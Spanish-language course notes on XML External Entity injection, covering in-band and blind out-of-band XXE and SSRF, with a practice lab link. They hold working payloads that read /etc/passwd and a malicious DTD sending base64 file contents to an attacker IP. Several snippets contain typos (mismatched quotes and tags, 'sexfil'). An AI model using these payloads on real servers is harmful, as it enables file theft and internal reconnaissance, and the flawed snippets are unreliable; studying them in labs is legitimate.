-----------
Tags: #xxe

----------
**XML External Entity** (**XXE**) **Injection** es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:
- **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)

### Qué es XML

![[Pasted image 20230901172521.png]]
Las **entidades** son una forma de representar un elemento de datos sin referenciar a los datos como tal, todo ello en un documento XML. Las principales entidades son:
- Genéricas/Customizadas
- Externas (XXE)
- Predefinidas:
	- &lt;
	- &gt;

La estructura XML es la siguiente:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "miEntidad">]> //DTD(Document Type Definition)

<Profesores>
	<Nombre>S4vitar</Nombre>
	<Edad>27</Edad>
	<Rol>Lammer</Rol>
</Hack4u>
```

## Tipos de wrappers 
- file:///etc/passwd
- php://filter/convert.base64-encode/resource=/etc/passwd
-------------
## XXE básico con output

Nos aprovechamos de DTD para poder leer archivos de la máquina objetivo. Ya que el servidor interpreta las etiquetas xml, es posible inyectar.
```xml
<?xml version="1.0' encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]> 
<root>
	<name> test</name>
	<tel>123456789</tel>
	<email>&myFile;</email>
	<password>s4vitar123</password>
</root>
```

## XXE OOB

Utilizamos el DTD pero no se ve la respuesta.

![[Pasted image 20230901181130.png]]
Escuchando desde la máquina atacante con un servidor python por el puerto 80.
![[Captura de pantalla 2023-09-01 a las 18.12.54.png]]
Escuchamos en la maquina atacante las peticiones y con el siguiente archivo xml.
```xml
<?xml version="1.0' encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % myFile SYSTEM "http://192.168.111.45/testXXE"> %myFile;]>
<root>
	<name> test</name>
	<tel>123456789</tel>
	<email>&myFile;</email>
	<password>s4vitar123</password>
</root>
```

Si queremos leer un archivo del sistema objetivo, sería de la siguiente forma con malicious.dtd
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#×25; exfil SYSTEM 'http://192.168.111.45/?file=%file;'>">
%eval;
sexfil;
```
Nosotros como atacantes le veremos en base64.

Con todo esto podemos hacer un script que automatice todo el proceso.
![[Captura de pantalla 2023-09-02 a las 11.01.22.png]]

## SSRF
![[Captura de pantalla 2023-09-02 a las 11.03.55.png]]